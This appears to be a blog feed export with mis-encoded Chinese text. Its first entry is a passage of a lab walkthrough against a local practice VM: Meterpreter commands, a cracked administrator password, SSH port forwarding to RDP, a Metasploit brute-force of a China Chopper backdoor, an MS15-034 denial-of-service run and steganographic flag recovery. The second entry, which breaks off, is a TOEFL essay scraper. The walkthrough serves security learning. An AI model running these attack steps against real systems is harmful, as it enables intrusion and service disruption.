a channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: File system Commands</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    cat           Read the contents of a file to the screen</span><br><span class="line">    download      Download a file or directory</span><br><span class="line">    edit          Edit a file</span><br><span class="line">    getlwd        Print local working directory</span><br><span class="line">    lcd           Change local working directory</span><br><span class="line">    lls           List local files</span><br><span class="line">    lpwd          Print local working directory</span><br><span class="line">    upload        Upload a file or directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Networking Commands</span><br><span class="line">===========================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    portfwd       Forward a local port to a remote service</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Audio Output Commands</span><br><span class="line">=============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    play          play a waveform audio file (.wav) on the target system</span><br></pre></td></tr></table></figure><h2 id="ï¼ˆ2ï¼‰sshæµ‹è¯•"><a href="#ï¼ˆ2ï¼‰sshæµ‹è¯•" class="headerlink" title="ï¼ˆ2ï¼‰sshæµ‹è¯•"></a>ï¼ˆ2ï¼‰sshæµ‹è¯•</h2><ol><li><p>é¦–å…ˆï¼Œé€šè¿‡hydraè¿›è¡Œå¯†ç çˆ†ç ´ï¼Œå¾—åˆ°Administratorè´¦å·å¯†ç ï¼šadmin321ï¼Œå³å¯å»ºç«‹sshé“¾æ¥ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€$ ssh Administrator@10.0.2.4</span><br><span class="line">Administrator@10.0.2.4&#x27;s password: </span><br><span class="line">-sh-4.3$ </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>æ£€æµ‹3389ç«¯å£ï¼Œå‘ç°ç«¯å£æ˜¯æ‰“å¼€çš„</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€$ nmap -p 3389 10.0.2.4                                                                     </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-17 01:57 EST</span><br><span class="line">Nmap scan report for 10.0.2.4</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">3389/tcp filtered ms-wbt-server</span><br><span class="line">MAC Address: 08:00:27:0B:0C:01 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds</span><br></pre></td></tr></table></figure></li><li><p>ç«¯å£è½¬å‘ï¼Œå¹¶è¿›è¡Œè¿æ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€$ ssh -L 3389:localhost:3389 Administrator@10.0.2.4</span><br><span class="line">Administrator@10.0.2.4&#x27;s password: </span><br><span class="line">Last login: Thu Dec 16 22:54:07 2021 from 10.0.2.15</span><br><span class="line">-sh-4.3$ </span><br><span class="line">(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ rdesktop 127.0.0.1:3389</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/17/QcGxjgtXmf9631H.png" alt="desktop"></p></li><li><p>å®ç°å¯ä»¥ç›´æ¥åœ¨kaliæ”»å‡»æœºä¸Šè¿›è¡Œå¯¹é¶æœºçš„æ“ä½œ</p></li></ol><p>ï¼ˆ3ï¼‰caidao</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search caidao</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                            Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                            ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/multi/http/caidao_php_backdoor_exec     2015-10-27       excellent  Yes    China Chopper Caidao PHP Backdoor Code Execution</span><br><span class="line">   1  auxiliary/scanner/http/caidao_bruteforce_login                   normal     No     Chinese Caidao Backdoor Bruteforce</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/caidao_bruteforce_login                                                                                                        </span><br><span class="line"></span><br><span class="line">msf6 &gt; use auxiliary/scanner/http/caidao_bruteforce_login</span><br><span class="line">msf6 auxiliary(scanner/http/caidao_bruteforce_login) &gt; set RHOSTS 10.0.2.4</span><br><span class="line">RHOSTS =&gt; 10.0.2.4</span><br><span class="line">msf6 auxiliary(scanner/http/caidao_bruteforce_login) &gt; set TARGETURI /caidao.asp</span><br><span class="line">TARGETURI =&gt; /caidao.asp</span><br><span class="line">msf6 auxiliary(scanner/http/caidao_bruteforce_login) &gt; run</span><br><span class="line"></span><br><span class="line">[-] 10.0.2.4:80 - Failed: &#x27;admin&#x27;</span><br><span class="line">[-] 10.0.2.4:80 - Failed: &#x27;123456&#x27;</span><br><span class="line">[-] 10.0.2.4:80 - Failed: &#x27;12345&#x27;</span><br><span class="line">[-] 10.0.2.4:80 - Failed: &#x27;123456789&#x27;</span><br><span class="line">[+] 10.0.2.4:80 - Success: &#x27;password&#x27;</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°è¿æ¥å£ä»¤ï¼šâ€˜passwordâ€™</p><h2 id="ï¼ˆ4ï¼‰80ç«¯å£â€”http"><a href="#ï¼ˆ4ï¼‰80ç«¯å£â€”http" class="headerlink" title="ï¼ˆ4ï¼‰80ç«¯å£â€”http"></a>ï¼ˆ4ï¼‰80ç«¯å£â€”http</h2><p>MS15-034/CVE-2015-1635 HTTPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆè¿œç¨‹è“å±ä»£ç ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ms15_034</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                                  Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                                                  ---------------  ----    -----  -----------</span><br><span class="line">   0  auxiliary/dos/http/ms15_034_ulonglongadd                               normal  Yes    MS15-034 HTTP Protocol Stack Request Handling Denial-of-Service</span><br><span class="line">   1  auxiliary/scanner/http/ms15_034_http_sys_memory_dump                   normal  Yes    MS15-034 HTTP Protocol Stack Request Handling HTTP.SYS Memory Information Disclosure</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/ms15_034_http_sys_memory_dump                                                                                                  </span><br><span class="line"></span><br><span class="line">msf6 &gt; use auxiliary/dos/http/ms15_034_ulonglongadd </span><br><span class="line">msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; set RHOSTS 10.0.2.4</span><br><span class="line">RHOSTS =&gt; 10.0.2.4</span><br><span class="line">msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/dos/http/ms15_034_ulonglongadd):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS     10.0.2.4         yes       The target host(s), see https://github.com/rapid7/metasploit-framewor</span><br><span class="line">                                         k/wiki/Using-Metasploit</span><br><span class="line">   RPORT      80               yes       The target port (TCP)</span><br><span class="line">   SSL        false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI  /                no        URI to the site (e.g /site/) or a valid file resource (e.g /welcome.p</span><br><span class="line">                                         ng)</span><br><span class="line">   THREADS    1                yes       The number of concurrent threads (max one per host)</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; run</span><br><span class="line"></span><br><span class="line">[*] DOS request sent</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; run</span><br></pre></td></tr></table></figure><p>ç»“æœé¶æœºæ²¡æœ‰è“å±ï¼Œè€Œæ˜¯ç«‹å³é‡å¯äº†ï¼Œä¹Ÿè›®æœ‰è¶£çš„</p><h1 id="ä¸‰ã€åæ¸—é€é˜¶æ®µï¼ˆflagæŒ–æ˜ï¼‰"><a href="#ä¸‰ã€åæ¸—é€é˜¶æ®µï¼ˆflagæŒ–æ˜ï¼‰" class="headerlink" title="ä¸‰ã€åæ¸—é€é˜¶æ®µï¼ˆflagæŒ–æ˜ï¼‰"></a>ä¸‰ã€åæ¸—é€é˜¶æ®µï¼ˆflagæŒ–æ˜ï¼‰</h1><p>å¾ˆåƒæ˜¯åœ¨æ‰“CTFï¼Œåšå¾—è›®å¼€å¿ƒçš„~</p><h2 id="1-the-joker"><a href="#1-the-joker" class="headerlink" title="1. the_joker"></a>1. the_joker</h2><ol><li><p>å‘ç°80ç«¯å£æ˜¯æ‰“å¼€çš„ï¼Œç”¨æµè§ˆå™¨æ‰“å¼€ï¼Œä¸éš¾ä»htmlé¡µé¢å‘ç°éšè—çš„HEXä»£ç ï¼Œé€šè¿‡<code>curl http://10.0.2.4/ &gt; data.htmlcat data.html | perl -ne &#39;print $1 if(/value\=\&quot;(\w+)\&quot;\&gt;/g)&#39; &gt; data.hex</code> è·å¾—hex.txtè§é™„ä»¶</p></li><li><p>ä¸éš¾çŒœæƒ³å¯ç”±hexè½¬å›¾ç‰‡ï¼Œäºæ˜¯å†™å‡ºhex2png.pyï¼Œè·å¾—flagã€‚</p></li><li><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;hex.txt&#x27;</span>) <span class="keyword">as</span> f, <span class="built_in">open</span>(<span class="string">&#x27;data.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> fout:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        fout.write(binascii.unhexlify(line))</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2021/12/17/21KMvxdUwutezon.png" alt="joker"></p><h2 id="2-Ace-of-Hearts"><a href="#2-Ace-of-Hearts" class="headerlink" title="2. Ace_of_Hearts"></a>2. Ace_of_Hearts</h2><ol><li>æ‰“å¼€ç›®å½•ä¸éš¾æ‰¾åˆ°ä¸€å¼ æ™®é€šçš„çº¢æ¡ƒAï¼Œæ–‡ä»¶å¼‚å¸¸ä¹‹å¤§ï¼Œä¸éš¾å‘ç°ç«¯å€ªï¼Œå¯èƒ½æ˜¯å¤šæ–‡ä»¶éšè—ã€‚</li><li>æŸ¥çœ‹äºŒè¿›åˆ¶æ ¼å¼ï¼ŒæŠŠç¬¬ä¸€ä¸ªjpgæ–‡ä»¶åˆ å»ï¼Œå³å¾—åˆ°flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/nMzVcvW26uNOpyC.png" alt="ace_of_hearts"></p><h2 id="3-Jack-of-Hearts"><a href="#3-Jack-of-Hearts" class="headerlink" title="3.  Jack_of_Hearts"></a>3.  Jack_of_Hearts</h2><ol><li><p>ä¸éš¾åœ¨documentç›®å½•ä¸‹å‘ç°Jack_of_Hearts.docxï¼Œè€ƒè™‘å•æ–‡ä»¶docxä¸­çš„PNGéšè—æ–‡ä»¶</p></li><li><p>å°†docxæ–‡ä»¶åç¼€æ”¹ä¸º.zipå°±ä¼šå¾—åˆ°ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œåœ¨\word\mediaä¸­å°±èƒ½æ‰¾åˆ°éšè—çš„å›¾åƒflagæ–‡ä»¶ï¼‰</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/kmhuVc8ApNgj3yM.png" alt="jack_of_hearts"></p><h2 id="4-Six-of-Diamonds"><a href="#4-Six-of-Diamonds" class="headerlink" title="4. Six_of_Diamonds"></a>4. Six_of_Diamonds</h2><ol><li>åœ¨C:\inetpub\wwwrootç›®å½•ä¸‹ä¸éš¾æ‰¾åˆ°six_of_diamondså‹ç¼©åŒ…ï¼Œå‘ç°ç»è¿‡åŠ å¯†</li><li>é¦–å…ˆè€ƒè™‘æ˜¯ä¸æ˜¯ä¼ªåŠ å¯†ï¼Œå°†å…¨å±€æ–¹å¼ä½æ ‡è®°æ”¹ä¸º 00 00ï¼Œæœªèƒ½æˆåŠŸæ‰“å¼€ï¼Œè¯´æ˜ç¡®å®æœ‰å¯†ç </li><li>ä½¿ç”¨ARCHPRè¿›è¡Œçˆ†ç ´ï¼Œå¯†ç ä¸ºvagrantï¼Œè·å¾—flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/MxJXZNs3TrvQhou.png" alt="six_of_diamonds"></p><h2 id="5-King-of-Diamonds"><a href="#5-King-of-Diamonds" class="headerlink" title="5. King_of_Diamonds"></a>5. King_of_Diamonds</h2><p>åœ¨C:\wamp\www\wordpress\wp-content\uploads\2017\09ç›®å½•ä¸‹ç›´æ¥æ‰¾åˆ°King_of_Diamonds.png</p><p><img src="https://s2.loli.net/2021/12/17/cZ3u2kmh9aUxvg4.png" alt="king_of_damonds"></p><h2 id="6-Three-of-Spades"><a href="#6-Three-of-Spades" class="headerlink" title="6. Three_of_Spades"></a>6. Three_of_Spades</h2><ol><li><p>æ­¤å›¾ç‰‡æˆ‘ä¸€é€šå¥½æ‰¾ï¼Œçªç„¶æƒ³èµ·å¯èƒ½æ˜¯è¢«éšè—äº†ï¼Œæœ€ç»ˆåœ¨C:\windowsç›®å½•ä¸‹æ‰¾åˆ°äº†</p></li><li><p>ä½†æ˜¯ä»ç„¶æ— æ³•æ‰“å¼€ï¼ŒäºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€æ ¹æ®æ–‡ä»¶å¤´çŒœæµ‹æ–‡ä»¶è¢«å¤„ç†è¿‡ï¼Œå¯¹æ–‡ä»¶å¼‚æˆ–æ“ä½œï¼Œè·å¾—æ­£å¸¸pngæ ¼å¼</p></li><li><p>å¤„ç†å›¾ç‰‡çš„ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">_<span class="keyword">in</span> = <span class="string">&#x27;three_of_spades.png&#x27;</span>;</span><br><span class="line">_out = _<span class="keyword">in</span> + <span class="string">&#x27;.out&#x27;</span>;</span><br><span class="line"></span><br><span class="line">b = <span class="built_in">bytearray</span>(<span class="built_in">open</span>(_<span class="keyword">in</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">    b[i] ^= <span class="number">0x0f</span></span><br><span class="line"><span class="built_in">open</span>(_out, <span class="string">&#x27;wb&#x27;</span>).write(b)</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2021/12/17/4yeYRt9ZzgNpn8W.png" alt="three_of_spades"></p><h2 id="7-Seven-of-Spades"><a href="#7-Seven-of-Spades" class="headerlink" title="7. Seven_of_Spades"></a>7. Seven_of_Spades</h2><ol><li>åœ¨Libraries\Documentsç›®å½•ä¸‹å‘ç°Seven of Spades.pdfï¼Œä¸éš¾æƒ³åˆ°æ˜¯éšè—åœ¨æ–‡ä»¶é‡Œäº†ï¼Œä½¿ç”¨pdf-parserå³å¯è·å¾—flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/gLJlobmzvewOQI1.png" alt="seven_of_spades"></p><h2 id="8-Four-of-Clubs"><a href="#8-Four-of-Clubs" class="headerlink" title="8. Four_of_Clubs"></a>8. Four_of_Clubs</h2><ol><li>ç±»ä¼¼7ï¼ŒLibraries\Musicç›®å½•ä¸‹æ‰¾åˆ°Four_of_Clubs.wavï¼Œä½¿ç”¨binwalkåˆ†ç¦»å…¶ä¸­çš„flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/PWTZSrDiycuUKgX.png" alt="four_of-clubs"></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cyber Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonçˆ¬è™«ç¬”è®°</title>
      <link href="/2021/10/22/Python%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/10/22/Python%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ä½¿ç”¨requestså’Œbs4çˆ¬å–æ–°ä¸œæ–¹ä½œæ–‡"><a href="#ä½¿ç”¨requestså’Œbs4çˆ¬å–æ–°ä¸œæ–¹ä½œæ–‡" class="headerlink" title="ä½¿ç”¨requestså’Œbs4çˆ¬å–æ–°ä¸œæ–¹ä½œæ–‡"></a>ä½¿ç”¨requestså’Œbs4çˆ¬å–æ–°ä¸œæ–¹ä½œæ–‡</h1><p>å…¶å®è¿™æ˜¯å½“æ—¶å­¦çˆ¬è™«çš„æœ€åˆåŠ¨åŠ›ï¼Œçˆ¬ç‚¹èŒƒæ–‡ï¼ˆdogeï¼‰<br>æŠ€æœ¯è·¯çº¿çš„å­¦ä¹ éƒ½è®°å½•åœ¨ä¸‹é¢ï¼Œæ·±æ„Ÿåšå®¢æ‚ä¹±ä¸å®Œæ•´ï¼Œè¯•å›¾æ•´ç†äº†ä¸€éã€‚</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fetchUrl</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    åŠŸèƒ½ï¼šè®¿é—® url çš„ç½‘é¡µï¼Œè·å–ç½‘é¡µå†…å®¹å¹¶è¿”å›</span></span><br><span class="line"><span class="string">    å‚æ•°ï¼šç›®æ ‡ç½‘é¡µçš„ url</span></span><br><span class="line"><span class="string">    è¿”å›ï¼šç›®æ ‡ç½‘é¡µçš„ html å†…å®¹</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = requests.get(url, headers=headers)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getContent</span>(<span class="params">html</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    åŠŸèƒ½ï¼šè§£æ HTML ç½‘é¡µï¼Œè·å–æ–°é—»çš„æ–‡ç« å†…å®¹</span></span><br><span class="line"><span class="string">    å‚æ•°ï¼šhtml ç½‘é¡µå†…å®¹</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    new_html = html.replace(<span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    bsobj = bs4.BeautifulSoup(new_html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    <span class="comment"># è·å–æ–‡ç«  å†…å®¹</span></span><br><span class="line">    temp = bsobj.find(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;style_stem-text__3Vgg5&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> temp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        text = temp.find(<span class="string">&#x27;p&#x27;</span>).get_text()</span><br><span class="line">        <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveFile</span>(<span class="params">content, path, filename</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    åŠŸèƒ½ï¼šå°†æ–‡ç« å†…å®¹ content ä¿å­˜åˆ°æœ¬åœ°æ–‡ä»¶ä¸­</span></span><br><span class="line"><span class="string">    å‚æ•°ï¼šè¦ä¿å­˜çš„å†…å®¹ï¼Œè·¯å¾„ï¼Œæ–‡ä»¶å</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># å¦‚æœæ²¡æœ‰è¯¥æ–‡ä»¶å¤¹ï¼Œåˆ™è‡ªåŠ¨ç”Ÿæˆ</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">        os.makedirs(path)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä¿å­˜æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path + filename, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPageList</span>(<span class="params">pageUrl</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    åŠŸèƒ½ï¼šè·å–æ–‡ç« é“¾æ¥åˆ—è¡¨</span></span><br><span class="line"><span class="string">    å‚æ•°ï¼šæ–‡ç« é“¾æ¥</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    html = fetchUrl(pageUrl)</span><br><span class="line">    bsobj = bs4.BeautifulSoup(html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    pageList = bsobj.find_all(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;style_question-item-content__zwx24&#x27;</span>&#125;)</span><br><span class="line">    linkList = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> pageList:</span><br><span class="line">        temp = page.find(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        link = temp[<span class="string">&quot;href&quot;</span>]</span><br><span class="line">        url = <span class="string">&quot;https://liuxue.koolearn.com&quot;</span> + link</span><br><span class="line">        linkList.append(url)</span><br><span class="line">    <span class="keyword">return</span> linkList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_article</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    åŠŸèƒ½ï¼šçˆ¬å–ç½‘é¡µæ–‡ç« ï¼Œå¹¶ä¿å­˜åœ¨ æŒ‡å®šç›®å½•ä¸‹</span></span><br><span class="line"><span class="string">    å‚æ•°ï¼šæ–‡ä»¶ä¿å­˜çš„æ ¹ç›®å½•</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    path = <span class="string">&quot;D:/TOEFL/Writing/&quot;</span></span><br><span class="line">    baseurl = <span class="string">&quot;https://liuxue.koolearn.com/toefl/write-0-&quot;</span></span><br><span class="line">    suffix = <span class="string">&quot;-0/&quot;</span></span><br><span class="line">    var = <span class="number">997</span></span><br><span class="line">    cnt = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> var &gt;= <span class="number">953</span>:</span><br><span class="line">        page_url = baseurl + <span class="built_in">str</span>(var) + suffix</span><br><span class="line">        articles = getPageList(page_url)</span><br><span class="line">        <span class="keyword">for</span> article <span class="keyword">in</span> articles:</span><br><span class="line">            <span class="comment"># è·å–æ–°é—»æ–‡ç« å†…å®¹</span></span><br><span class="line">            html = fetchUrl(article)</span><br><span class="line">            content = 